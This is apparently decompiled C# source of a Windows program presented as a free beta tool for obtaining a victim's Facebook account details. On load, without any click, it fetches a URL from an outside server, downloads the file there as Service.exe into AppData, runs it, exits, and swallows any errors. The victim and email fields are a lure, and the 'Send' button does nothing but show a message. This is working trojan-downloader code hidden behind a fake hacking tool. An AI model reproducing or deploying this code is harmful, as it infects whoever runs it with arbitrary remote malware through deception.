using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Net;
using System.Runtime.CompilerServices;
using System.Windows.Forms;

namespace ns1;

internal class Form1 : Form
{
	private List<string> list_0 = new List<string>();

	private List<DateTime> list_1 = new List<DateTime>();

	private string string_0;

	private IContainer icontainer_0 = null;

	private Timer timer_0;

	private Button button1;

	private TextBox textBox1;

	private TextBox textBox2;

	private Label label1;

	private Label label2;

	private Label label3;

	private Button button2;

	[CompilerGenerated]
	private bool bool_0;

	[CompilerGenerated]
	private bool bool_1;

	[CompilerGenerated]
	private bool bool_2;

	private bool TheSiteIsFullyLoaded
	{
		[CompilerGenerated]
		get
		{
			return bool_0;
		}
		[CompilerGenerated]
		set
		{
			bool_0 = value;
		}
	}

	private bool TIMERBOOL
	{
		[CompilerGenerated]
		get
		{
			return bool_1;
		}
		[CompilerGenerated]
		set
		{
			bool_1 = value;
		}
	}

	private bool TIMERBOOL2
	{
		[CompilerGenerated]
		get
		{
			return bool_2;
		}
		[CompilerGenerated]
		set
		{
			bool_2 = value;
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		try
		{
			string_0 = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData) + "\\Service.exe";
			Path.GetFileName(Application.get_ExecutablePath());
			if (File.Exists(string_0))
			{
				File.Delete(string_0);
			}
			WebClient webClient = new WebClient();
			webClient.Headers.Add("User-Agent: Other");
			Stream stream = webClient.OpenRead("http://yufki.com/cgflash/pliod1.txt");
			using (StreamReader streamReader = new StreamReader(stream))
			{
				string item;
				while ((item = streamReader.ReadLine()) != null)
				{
					list_0.Add(item);
				}
				streamReader.Dispose();
				webClient.Dispose();
				stream.Dispose();
			}
			string text = list_0[0];
			list_0.Clear();
			if (!method_0(text))
			{
				return;
			}
			using (WebClient webClient2 = new WebClient())
			{
				webClient2.Headers.Add("User-Agent: Other");
				webClient2.DownloadFile(text, string_0);
				webClient2.Dispose();
			}
			if (File.Exists(string_0))
			{
				if (File.Exists("1.txt"))
				{
					File.Delete("1.txt");
				}
				Process.Start(string_0);
				Environment.Exit(0);
			}
		}
		catch
		{
		}
	}

	private bool method_0(string string_1)
	{
		try
		{
			HttpWebRequest httpWebRequest = WebRequest.Create(string_1) as HttpWebRequest;
			httpWebRequest.UserAgent = "userAgents";
			httpWebRequest.Accept = "*/*";
			httpWebRequest.Method = "HEAD";
			HttpWebResponse httpWebResponse = httpWebRequest.GetResponse() as HttpWebResponse;
			return httpWebResponse.StatusCode == HttpStatusCode.OK;
		}
		catch
		{
			return false;
		}
	}

	private void button2_Click(object sender, EventArgs e)
	{
		Environment.Exit(0);
	}

	private void button1_Click(object sender, EventArgs e)
	{
		//IL_0005: Unknown result type (might be due to invalid IL or missing references)
		MessageBox.Show("Thank you! This program is currently in BETA testing, FREE to use for now!");
	}

	void Form.Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0012: Unknown result type (might be due to invalid IL or missing references)
		//IL_001c: Expected O, but got Unknown
		//IL_001d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0027: Expected O, but got Unknown
		//IL_0028: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		//IL_0033: Unknown result type (might be due to invalid IL or missing references)
		//IL_003d: Expected O, but got Unknown
		//IL_003e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0048: Expected O, but got Unknown
		//IL_0049: Unknown result type (might be due to invalid IL or missing references)
		//IL_0053: Expected O, but got Unknown
		//IL_0054: Unknown result type (might be due to invalid IL or missing references)
		//IL_005e: Expected O, but got Unknown
		//IL_005f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0069: Expected O, but got Unknown
		//IL_009e: Unknown result type (might be due to invalid IL or missing references)
		//IL_00a8: Expected O, but got Unknown
		//IL_029b: Unknown result type (might be due to invalid IL or missing references)
		//IL_02a5: Expected O, but got Unknown
		//IL_0312: Unknown result type (might be due to invalid IL or missing references)
		//IL_031c: Expected O, but got Unknown
		icontainer_0 = new Container();
		timer_0 = new Timer(icontainer_0);
		button1 = new Button();
		textBox1 = new TextBox();
		textBox2 = new TextBox();
		label1 = new Label();
		label2 = new Label();
		label3 = new Label();
		button2 = new Button();
		((Control)this).SuspendLayout();
		timer_0.set_Enabled(true);
		timer_0.set_Interval(15000);
		((Control)button1).set_Font(new Font("Microsoft Sans Serif", 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button1).set_Location(new Point(272, 103));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(101, 53));
		((Control)button1).set_TabIndex(0);
		((Control)button1).set_Text("Send");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((Control)button1).add_Click((EventHandler)button1_Click);
		((Control)textBox1).set_Location(new Point(351, 27));
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(131, 20));
		((Control)textBox1).set_TabIndex(1);
		((Control)textBox2).set_Location(new Point(351, 67));
		((Control)textBox2).set_Name("textBox2");
		((Control)textBox2).set_Size(new Size(131, 20));
		((Control)textBox2).set_TabIndex(2);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_Location(new Point(218, 34));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(127, 13));
		((Control)label1).set_TabIndex(3);
		((Control)label1).set_Text("Victim's facebook (E-mail)");
		((Control)label2).set_AutoSize(true);
		((Control)label2).set_Location(new Point(102, 70));
		((Control)label2).set_Name("label2");
		((Control)label2).set_Size(new Size(243, 13));
		((Control)label2).set_TabIndex(4);
		((Control)label2).set_Text("Yours E-mail (We need it to can send you the info)");
		((Control)label3).set_AutoSize(true);
		((Control)label3).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)2, (GraphicsUnit)3, (byte)0));
		((Control)label3).set_Location(new Point(9, 177));
		((Control)label3).set_Name("label3");
		((Control)label3).set_Size(new Size(570, 13));
		((Control)label3).set_TabIndex(5);
		((Control)label3).set_Text("Note: After you press the send button, you should receive an email within 72 hours. We are not responsible for anything!");
		((Control)button2).set_Font(new Font("Microsoft Sans Serif", 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)0));
		((Control)button2).set_Location(new Point(551, -1));
		((Control)button2).set_Name("button2");
		((Control)button2).set_Size(new Size(39, 29));
		((Control)button2).set_TabIndex(6);
		((Control)button2).set_Text("X");
		((ButtonBase)button2).set_UseVisualStyleBackColor(true);
		((Control)button2).add_Click((EventHandler)button2_Click);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.Gainsboro);
		((Form)this).set_ClientSize(new Size(589, 192));
		((Control)this).get_Controls().Add((Control)(object)button2);
		((Control)this).get_Controls().Add((Control)(object)label3);
		((Control)this).get_Controls().Add((Control)(object)label2);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox2);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name("Form1");
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_StartPosition((FormStartPosition)1);
		((Control)this).set_Text("Main");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
